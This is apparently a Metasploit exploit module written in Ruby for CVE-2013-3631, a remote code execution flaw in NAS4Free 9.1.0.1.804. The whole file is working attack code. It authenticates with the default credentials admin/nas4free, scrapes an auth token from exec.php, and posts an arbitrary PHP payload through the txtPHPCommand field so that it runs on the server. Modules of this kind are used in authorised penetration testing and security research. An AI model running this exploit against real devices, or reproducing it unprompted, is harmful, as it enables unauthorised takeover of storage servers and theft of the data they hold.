# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;rexml/document&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;NAS4Free Arbitrary Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
      NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have
      the code executed remotely. This module was successfully tested against NAS4Free version
      9.1.0.1.804. Earlier builds are likely to be vulnerable as well.
      },
      &#039;Author&#039;         => [
        &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039; # Discovery / msf module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-3631&#039;],
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats&#039;]
        ],
      &#039;Payload&#039;  =>
        {
          &#039;Space&#039; => 21244,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039; => &#039;&#039;
        },
      &#039;Targets&#039;  =>
        [
          [ &#039;Automatic Target&#039;, { } ]
        ],
      &#039;Privileged&#039; => true,
      &#039;Platform&#039; => [&#039;php&#039;],
      &#039;Arch&#039; => ARCH_PHP,
      &#039;DisclosureDate&#039; => &#039;Oct 30 2013&#039;,
      &#039;DefaultTarget&#039; => 0))

      register_options([
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", "admin"]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", "nas4free"])
      ], self.class)
  end

  def exploit
    init = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/&#039;)
    })

    sess = init.get_cookies

    post = {
      &#039;username&#039; => datastore["USERNAME"],
      &#039;password&#039; => datastore["PASSWORD"]
    }

    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login.php&#039;),
      &#039;vars_post&#039; => post,
      &#039;cookie&#039; => sess
    })

    if !login or login.code != 302
      fail_with("Login failed")
    end

    exec_resp = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/exec.php&#039;),
      &#039;cookie&#039; => sess
    })

    if !exec_resp or exec_resp.code != 200
      fail_with(&#039;Error getting auth token from exec.php&#039;)
    end

    authtoken = &#039;&#039;
    #The html returned is not well formed, so I can&#039;t parse it with rexml
    exec_resp.body.each_line do |line|
      next if line !~ /authtoken/
      authtoken = line
    end

    doc = REXML::Document.new authtoken
    input = doc.root

    if !input
      fail_with(&#039;Error getting auth token&#039;)
    end

    token = input.attributes["value"]

    data = Rex::MIME::Message.new
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="txtCommand"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="txtRecallBuffer"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="dlPath"&#039;)
    data.add_part(&#039;&#039;, &#039;application/octet-stream&#039;, nil, &#039;form-data; name="ulfile"; filename=""&#039;)
    data.add_part(payload.encoded, nil, nil, &#039;form-data; name="txtPHPCommand"&#039;)
    #data.add_part(token, nil, nil, &#039;form-data; name="authtoken"&#039;)

    #I need to build the last data part by hand due to a bug in rex
    data_post = data.to_s
    data_post = data_post[0..data_post.length-data.bound.length-7]

    data_post << "\r\n--#{data.bound}"
    data_post << "\r\nContent-Disposition: form-data; name=\"authtoken\"\r\n\r\n"
    data_post << token
    data_post << "\r\n--#{data.bound}--\r\n\r\n"

    resp = send_request_raw({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/exec.php&#039;),
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039; => data_post,
      &#039;cookie&#039; => sess
    })
  end
end

